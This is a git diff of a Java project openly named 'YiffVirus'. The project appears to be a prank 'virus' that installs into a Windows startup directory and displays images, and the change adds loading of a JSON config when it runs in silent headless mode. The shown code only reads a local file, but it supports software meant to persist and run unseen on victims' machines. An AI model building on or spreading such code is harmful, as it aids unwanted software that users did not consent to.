@@ -3,6 +3,7 @@ package me.bannock.virus;
 
 import com.formdev.flatlaf.FlatDarculaLaf;
 import com.formdev.flatlaf.FlatDarkLaf;
+import com.google.gson.Gson;
 import me.bannock.virus.images.ImageProviderService;
 import me.bannock.virus.images.impl.TestImageProviderService;
 import me.bannock.virus.images.impl.YiffProviderService;
@@ -12,6 +13,8 @@ import javax.swing.JFrame;
 import java.awt.GridLayout;
 import java.awt.HeadlessException;
 import java.io.File;
+import java.io.IOException;
+import java.nio.file.Files;
 import java.util.Arrays;
 import java.util.Timer;
 
@@ -19,7 +22,8 @@ public class YiffVirus extends JFrame implements Runnable {
 
     private Config config = new Config();
     private final ImageProviderService imageProviderService = new TestImageProviderService();
-    private static final File AUTOSTART_CONFIG_FILE = new File(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR, "msg.json");
+
+    protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR, "msg.json");
 
     /**
      * Creates a new gui window
@@ -49,8 +53,12 @@ public class YiffVirus extends JFrame implements Runnable {
             switch(arg.toLowerCase()){
                 case "-headless":{
                     showGui = false;
+                    if (HEADLESS_CONFIG_FILE.exists()) {
+                        try {
+                            yiffVirus.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
+                        } catch (IOException ignored) {}
+                    }
                     yiffVirus.run();
-                    // TODO: Auto load config and run virus
                 }break;
             }
         }
